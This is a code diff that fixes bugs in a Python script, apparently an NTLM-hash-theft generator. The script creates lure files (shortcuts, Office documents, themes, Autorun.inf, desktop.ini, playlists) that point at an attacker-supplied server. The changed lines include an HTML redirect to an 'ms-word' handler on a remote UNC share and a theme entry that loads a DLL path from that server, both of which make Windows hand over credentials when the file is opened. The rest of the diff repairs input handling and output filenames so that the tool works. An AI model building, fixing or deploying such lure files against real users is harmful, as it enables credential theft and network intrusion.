@@ -165,7 +165,7 @@ def create_htm_handler(generate,server,filename):
 	file.write('''<!DOCTYPE html>
 <html>
 	<script>
-		location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
+		location.href = 'ms-word:ofe|u|\\''' + server + '''\\leak\\leak.docx';
 	</script>
 </html>''')
 	file.close()
@@ -473,7 +473,7 @@ MTSM=RJSPBS
 ; IDS_SCHEME_DEFAULT
 SchemeName=@\\\\'''+server+'''\\setup.dll,-800
 		''')
-	print("Created: " + filename + " (THEME TO INSTALL")
+	print("Created: " + filename + " (THEME TO INSTALL)")
 
 def create_autoruninf(generate,server,filename):
 	if generate == "modern":
@@ -554,107 +554,107 @@ def create_lnk(generate,server,filename):
 
 # create folder to hold templates, if already exists delete it
 if os.path.exists(args.filename):
-	if input(f"Are you sure to want to delete {args.filename}? [Y/N]").lower not in ["y", "yes"]:
+	if input(f"Are you sure to want to delete {args.filename}? [Y/N]").lower() not in ["y", "yes"]:
 		exit(0)
 	shutil.rmtree(args.filename)
 os.makedirs(args.filename)
 
 # handle which documents to create
 if (args.generate == "all" or args.generate == "modern"):
-	create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))
+	create_scf(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".scf"))
 
-	create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
-	create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))
+	create_url_url(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(url).url"))
+	create_url_icon(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(icon).url"))
 
-	create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))
+	create_lnk(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".lnk"))
 
-	create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))
+	create_rtf(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".rtf"))
 
-	create_xml(args.generate, args.server, os.path.join(args.filename, args.filename + "-(stylesheet).xml"))
-	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))
+	create_xml(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(stylesheet).xml"))
+	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(fulldocx).xml"))
 
-	create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))
-	create_htm_handler(args.generate, args.server, os.path.join(args.filename, args.filename + "-(handler).htm"))
+	create_htm(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".htm"))
+	create_htm_handler(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(handler).htm"))
 
-	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
-	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
-	create_docx_frameset(args.generate, args.server, os.path.join(args.filename, args.filename + "-(frameset).docx"))
+	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(includepicture).docx"))
+	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(remotetemplate).docx"))
+	create_docx_frameset(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(frameset).docx"))
 
-	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
+	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(externalcell).xlsx"))
 
-	create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))
+	create_wax(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".wax"))
 
-	create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))
+	create_m3u(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".m3u"))
 
-	create_asx(args.generate, args.server, os.path.join(args.filename, args.filename + ".asx"))
+	create_asx(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".asx"))
 
-	create_jnlp(args.generate, args.server, os.path.join(args.filename, args.filename + ".jnlp"))
+	create_jnlp(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".jnlp"))
 
-	create_application(args.generate, args.server, os.path.join(args.filename, args.filename + ".application"))
+	create_application(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".application"))
 
-	create_pdf(args.generate, args.server, os.path.join(args.filename, args.filename + ".pdf"))
+	create_pdf(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".pdf"))
 
 	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))
 
-	create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))
+	create_libraryms(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".library-ms"))
 
 	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))
 
 	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))
 
-	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
+	create_theme(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".theme"))
 
 elif(args.generate == "scf"):
-	create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))
+	create_scf(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".scf"))
 
 elif(args.generate == "url"):
-	create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
-	create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))
+	create_url_url(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(url).url"))
+	create_url_icon(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(icon).url"))
 
 elif(args.generate == "lnk"):
-	create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))
+	create_lnk(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".lnk"))
 
 elif(args.generate == "rtf"):
-	create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))
+	create_rtf(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".rtf"))
 
 elif(args.generate == "xml"):
-	create_xml(args.generate, args.server, os.path.join(args.filename, args.filename + "-(stylesheet).xml"))
-	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))
+	create_xml(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(stylesheet).xml"))
+	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(fulldocx).xml"))
 
 elif(args.generate == "htm"):
-	create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))
+	create_htm(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".htm"))
 
 elif(args.generate == "docx"):
-	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
-	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
-	create_docx_frameset(args.generate, args.server, os.path.join(args.filename, args.filename + "-(frameset).docx"))
+	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(includepicture).docx"))
+	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(remotetemplate).docx"))
+	create_docx_frameset(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(frameset).docx"))
 
 elif(args.generate == "xlsx"):
-	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
+	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + "-(externalcell).xlsx"))
 	
 elif(args.generate == "wax"):
-	create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))
+	create_wax(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".wax"))
 
 elif(args.generate == "m3u"):
-	create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))
+	create_m3u(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".m3u"))
 
 elif(args.generate == "asx"):
-	create_asx(args.generate, args.server, os.path.join(args.filename, args.filename + ".asx"))
+	create_asx(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".asx"))
 
 elif(args.generate == "jnlp"):
-	create_jnlp(args.generate, args.server, os.path.join(args.filename, args.filename + ".jnlp"))
+	create_jnlp(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".jnlp"))
 
 elif(args.generate == "application"):
-	create_application(args.generate, args.server, os.path.join(args.filename, args.filename + ".application"))
+	create_application(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".application"))
 
 elif(args.generate == "pdf"):
-	create_pdf(args.generate, args.server, os.path.join(args.filename, args.filename + ".pdf"))
+	create_pdf(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".pdf"))
 
 elif(args.generate == "zoom"):
 	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))
 
 elif(args.generate == "libraryms"):
-	create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))
+	create_libraryms(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".library-ms"))
 
 elif(args.generate == "autoruninf"):
 	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))
@@ -663,6 +663,6 @@ elif(args.generate == "desktopini"):
 	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))
 
 elif(args.generate == "theme"):
-	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
+	create_theme(args.generate, args.server, os.path.join(args.filename, os.path.basename(args.filename.rstrip("/\\")) + ".theme"))
 
 print("Generation Complete.")
